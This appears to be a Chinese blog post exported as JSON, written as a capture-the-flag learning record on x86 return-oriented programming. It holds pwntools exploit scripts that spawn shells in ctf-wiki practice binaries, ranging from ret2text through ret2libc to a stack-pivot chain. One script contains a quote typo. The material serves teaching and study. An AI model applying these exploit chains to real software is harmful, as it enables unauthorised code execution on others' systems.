{"title":"ROP-x86","uid":"a1737faa9c5d2f3d8075974e9ccad146","slug":"ROP-x86","date":"2021-06-05T10:23:30.000Z","updated":"2021-10-19T12:53:01.860Z","comments":true,"path":"api/articles/ROP-x86.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/3ZBmwPkcIXjUE17.jpg","content":"<h1 id=\"ROP原理\"><a href=\"#ROP原理\" class=\"headerlink\" title=\"ROP原理\"></a>ROP原理</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>\n</ul>\n<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>\n<h1 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2text</a></h1><h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>控制程序执行程序本身已有的的代码 (.text)</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>首先查看附件，32位可执行文件且只开了NX保护</p>\n<p><img src=\"https://i.loli.net/2021/06/06/TX1cHdubI45RlPp.png\" alt=\"image.png\"></p>\n<p>利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞<img src=\"https://i.loli.net/2021/06/06/i4CJDosGfOb1TEQ.png\" alt=\"image.png\"></p>\n<p>不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell<img src=\"https://i.loli.net/2021/06/06/Wsz8ARtm6n4LYIa.png\" alt=\"image.png\"></p>\n<p>接下来就是计算s的偏移量。设置断点0x08048641，进行调试</p>\n<p>可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4<img src=\"https://i.loli.net/2021/06/06/KFQVS5bCJfePYTs.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2text&#x27;</span>)</span><br><span class=\"line\">target = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(target))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>通过栈溢出直接跳转到对应的后门函数，从而获取shell，堆栈图如下：</p>\n<p><img src=\"https://i.loli.net/2021/10/16/Iun5QrlVOhaJwRK.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode\">ret2shellcode</a></h1><h2 id=\"方法-1\"><a href=\"#方法-1\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>程序执行我们自己填充的shellcode代码</p>\n<h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现system函数，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，<img src=\"https://i.loli.net/2021/06/06/QbU3YlyvFrws2V8.png\" alt=\"image.png\"><img src=\"https://i.loli.net/2021/06/06/3lnkurmIjBxszJG.png\" alt=\"image.png\"></p>\n<p>先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址<img src=\"https://i.loli.net/2021/06/06/aVwCQ9mclOuWKdY.png\" alt=\"image.png\"></p>\n<p>在查看一下这个地址是否可执行。发现这个地址可读可写可执行。<img src=\"https://i.loli.net/2021/06/06/xFsyLRJPEoZ4YfS.png\" alt=\"image.png\"></p>\n<p>之后构建payload</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804A080</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">112</span>, <span class=\"string\">&#x27;a&#x27;</span>) + p32(buf2)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;解释一下&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;shellcraft.sh作用是生成好system(&quot;bin/sh&quot;)的代码&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;asm函数是将代码转成机器指令&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;ljust函数作用就是向右对其并用给定字符补充字符串&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>通过栈溢出跳转到我们写好shellcode的区域，让程序执行shellcode从而获取shell</p>\n<p><img src=\"https://i.loli.net/2021/10/16/gKpoSxOZ6EDCtrN.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2syscall</a></h1><h2 id=\"方法-2\"><a href=\"#方法-2\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>控制程序执行系统调用，获取 shell。</p>\n<h2 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>先查看附件</p>\n<p><img src=\"https://i.loli.net/2021/06/06/E548xu9R7JOXjph.png\" alt=\"image.png\"></p>\n<p>接下来利用 IDA 来查看源码，并没有system函数，而且也没有bin/sh字符<img src=\"https://i.loli.net/2021/06/06/Ih4PmFtxo63OgBn.png\" alt=\"image.png\"></p>\n<p>可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里<img src=\"https://i.loli.net/2021/06/06/mgMuoesVOpEzWXQ.png\" alt=\"image.png\"></p>\n<p>接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。<img src=\"https://i.loli.net/2021/06/06/qzpYFsk2cQNmg14.png\" alt=\"image.png\"></p>\n<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（<a href=\"https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8\">系统调用基本知识</a>）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：</p>\n<ul>\n<li>系统调用号，即 eax 应该为 0xb（是指系统调用编号）</li>\n<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>\n<li>第二个参数，即 ecx 应该为 0</li>\n<li>第三个参数，即 edx 应该为 0</li>\n</ul>\n<p>为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（<a href=\"https://www.wangan.com/docs/678\">ROPgadget安装与使用方法</a>）<img src=\"https://i.loli.net/2021/06/06/lExnp75bSDTwsyi.png\" alt=\"image.png\"></p>\n<p>接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./rop&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x80be408</span></span><br><span class=\"line\">payload =<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>+p32(pop_eax_ret)+ p32(<span class=\"number\">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class=\"number\">0</span>)+p32(<span class=\"number\">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/16/3Jz9KSrEgZDPcYW.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2libc1\"><a href=\"#ret2libc1\" class=\"headerlink\" title=\"ret2libc1\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1\">ret2libc1</a></h1><h2 id=\"方法-3\"><a href=\"#方法-3\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>利用gadgets构建ROP获取shell</p>\n<h2 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>check一下32位程序，且只开了NX保护</p>\n<p><img src=\"https://i.loli.net/2021/07/12/T7UivSYopaZFkxK.png\" alt=\"image.png\"></p>\n<p>丢进IDA，查看伪代码，存在gets函数，很明显存在栈溢出<img src=\"https://i.loli.net/2021/07/12/Z6y1jb4Rx7zoien.png\" alt=\"image.png\"></p>\n<p>查看函数列表以及字符串列表，很明显可以构建ROP<img src=\"https://i.loli.net/2021/07/12/R49gkfUZyHouv3e.png\" alt=\"屏幕截图 2021-07-12 101906.png\"></p>\n<p>最后就是计算偏移量。s的偏移量0xffffcfb8-ffffcf4c=6c，相对于返回地址的偏移量6c+4<img src=\"https://i.loli.net/2021/07/12/j4w8hMAQ1ntcyfp.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./ret2libc1&quot;</span>)</span><br><span class=\"line\">sys_addr = <span class=\"number\">0x8048460</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x08048720</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">112</span>+p32(sys_addr)+‘a<span class=\"string\">&#x27;*4+p32(bin_sh)</span></span><br><span class=\"line\"><span class=\"string\">p.sendline(payload)</span></span><br><span class=\"line\"><span class=\"string\">p.interactive()</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;因为调用system函数中途需要一个返回地址，而直接利用system gadget会导致缺失返回地址，所以需要一个虚拟地址p32(0x11111111)平衡堆栈&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/16/K6agdE8mjHhtR1M.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2libc2\"><a href=\"#ret2libc2\" class=\"headerlink\" title=\"ret2libc2\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2\">ret2libc2</a></h1><p>ida查看，可以看到这里有system函数，但是没有bin/sh，但是这里有gets函数，我们可以利用gets函数传入bin/sh字符，从而利用system获取shell</p>\n<p><img src=\"https://i.loli.net/2021/08/30/lJf9ZiPbnCsWDQq.png\" alt=\"屏幕截图 2021-08-30 093824.png\"></p>\n<p><img src=\"https://i.loli.net/2021/08/30/n2o6rlDEY1vsKhH.png\" alt=\"image.png\"></p>\n<p>计算好偏移，将通过gets获取的字符存入到bss段可写区域</p>\n<p><img src=\"https://i.loli.net/2021/08/30/XRCi8KrmfosnlcY.png\" alt=\"屏幕截图 2021-08-30 105444.png\"></p>\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">sys_addr = <span class=\"number\">0x08048490</span></span><br><span class=\"line\">bss = <span class=\"number\">0x804a000</span></span><br><span class=\"line\">gets_addr = <span class=\"number\">0x8048460</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x0804843d</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span>+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>栈示意图如下：</p>\n<p><img src=\"https://i.loli.net/2021/10/15/1oSdCuYms2y97iI.png\" alt=\"image.png\"></p>\n<h1 id=\"ret2libc3\"><a href=\"#ret2libc3\" class=\"headerlink\" title=\"ret2libc3\"></a>ret2libc3</h1><h2 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>这次的题目没有system函数，也没有bin/sh字符串，也不像ret2shellcode可以跳转执行shellcode，因此，只能换过一种思路。在libc.so 动态链接库中函数的偏移是固定的，所以我们可以通过泄露某个函数的偏移来确定程序使用的libc版本，从而获取system函数的的地址。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong>（所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序）具体操作如下：</p>\n<ul>\n<li><p>泄露 __libc_start_main 地址</p>\n</li>\n<li><p>获取 libc 版本</p>\n</li>\n<li><p>获取 system 地址与 /bin/sh 的地址</p>\n</li>\n<li><p>再次执行源程序</p>\n</li>\n<li><p>触发栈溢出执行 system(‘/bin/sh’)</p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"https://i.loli.net/2021/10/16/zTAHIWrEq6UB3Lf.png\" alt=\"屏幕截图 2021-10-16 145422.png\"></p>\n<h2 id=\"EXP-5\"><a href=\"#EXP-5\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">ret2libc3 = ELF(<span class=\"string\">&#x27;./ret2libc3&#x27;</span>)</span><br><span class=\"line\">puts_plt = ret2libc3.plt[<span class=\"string\">&#x27;puts&#x27;</span>]        <span class=\"comment\"># 获取程序中puts函数的plt地址</span></span><br><span class=\"line\">libc_puts_got = ret2libc3.got[<span class=\"string\">&#x27;puts&#x27;</span>]          <span class=\"comment\"># 获取程序中puts函数的got</span></span><br><span class=\"line\">start_addr = ret2libc3.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]        <span class=\"comment\"># 获取程序中_start函数的地址</span></span><br><span class=\"line\">payload1 = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, puts_plt,start_addr , libc_puts_got])        <span class=\"comment\"># 通过栈溢出让程序跳转到puts函数泄露出libc_puts_got地址再返回到start函数重新执行</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;Can you find it !?&#x27;</span>, payload1)</span><br><span class=\"line\">libc_puts_addr = u32(sh.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])         <span class=\"comment\"># 接收puts函数的地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)       <span class=\"comment\"># 确定程序使用的libc</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)       <span class=\"comment\"># 计算基地址</span></span><br><span class=\"line\">system_addr = libcbase + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)         <span class=\"comment\"># 计算出system函数以及bin/sh字符串的地址</span></span><br><span class=\"line\">binsh_addr = libcbase + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, system_addr, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>, binsh_addr])</span><br><span class=\"line\">sh.sendline(payload2)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p><img src=\"https://i.loli.net/2021/10/16/ZDnvcXt1YoPOlSV.png\" alt=\"image.png\"></p>\n<p>参考文章：<a href=\"https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall\">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall</a></p>\n<h1 id=\"NO-RELRO\"><a href=\"#NO-RELRO\" class=\"headerlink\" title=\"NO RELRO\"></a>NO RELRO</h1><p>介绍这道题前先补充一些知识点：</p>\n<p>在延迟绑定中说到dl_runtime_resolve 函数，只是说了这个函数会寻找程序第一次执行的函数但是并没有说原理，这次来补充一下。</p>\n<ol>\n<li><p>dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址</p>\n</li>\n<li><p>而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址</p>\n</li>\n<li><p>.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info</p>\n</li>\n<li><p>将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset</p>\n</li>\n<li><p>.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名</p>\n</li>\n<li><p>在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接</p>\n</li>\n</ol>\n<p><img src=\"https://i.loli.net/2021/10/19/zjxKC16SvowlBnE.png\" alt=\"image.png\"></p>\n<p>除此之外，还要讲一下栈迁移：</p>\n<p>栈迁移作用是让程序跳转到我们构造好的栈中从而让程序按照我们的思路走下去。</p>\n<ul>\n<li>先用无用字符填满到rbp</li>\n<li>在将rbp跳转到我们想构造的栈帧位置</li>\n<li>再通过read向我们想构造的栈中写入数据</li>\n<li>最后通过leave_ret将esp指向栈帧，ebp指向栈底位置</li>\n</ul>\n<p><img src=\"https://i.loli.net/2021/10/19/kEM9tCSUuiwFQ7d.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;main&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)<span class=\"comment\">#首先创建一个ROP对象</span></span><br><span class=\"line\">offset = <span class=\"number\">112</span></span><br><span class=\"line\">bss_addr = elf.bss()<span class=\"comment\">#返回bss段地址</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Welcome to XDCTF2015~!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## stack pivoting to bss segment</span></span><br><span class=\"line\"><span class=\"comment\">## new stack size is 0x800</span></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * offset)<span class=\"comment\">#在ROP链中填充offset个a</span></span><br><span class=\"line\">rop.read(<span class=\"number\">0</span>, base_stage, <span class=\"number\">100</span>)<span class=\"comment\">#简易的调用read函数，可向base_stage写入100个字节，相当于rop.call(&#x27;read&#x27;,[0,base_stage,100])</span></span><br><span class=\"line\">rop.migrate(base_stage)</span><br><span class=\"line\"><span class=\"comment\">#rop.migrate(base_stage)会将程序流程又转到base_stage</span></span><br><span class=\"line\">p.sendline(rop.chain())</span><br><span class=\"line\">rop = ROP(<span class=\"string\">&#x27;./main&#x27;</span>)</span><br><span class=\"line\">sh = <span class=\"string\">&quot;/bin/sh&quot;</span></span><br><span class=\"line\">rop.write(<span class=\"number\">1</span>, base_stage + <span class=\"number\">80</span>, <span class=\"built_in\">len</span>(sh))</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">80</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">rop.raw(sh)</span><br><span class=\"line\">rop.raw(<span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">100</span> - <span class=\"built_in\">len</span>(rop.chain())))</span><br><span class=\"line\">p.sendline(rop.chain())</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadge...","link":"","photos":[],"count_time":{"symbolsCount":"6.7k","symbolsTime":"6 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":2,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ROP%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">ROP原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2text\"><span class=\"toc-text\">ret2text</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2shellcode\"><span class=\"toc-text\">ret2shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-1\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2syscall\"><span class=\"toc-text\">ret2syscall</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-2\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2libc1\"><span class=\"toc-text\">ret2libc1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-3\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-3\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2libc2\"><span class=\"toc-text\">ret2libc2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2libc3\"><span class=\"toc-text\">ret2libc3</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 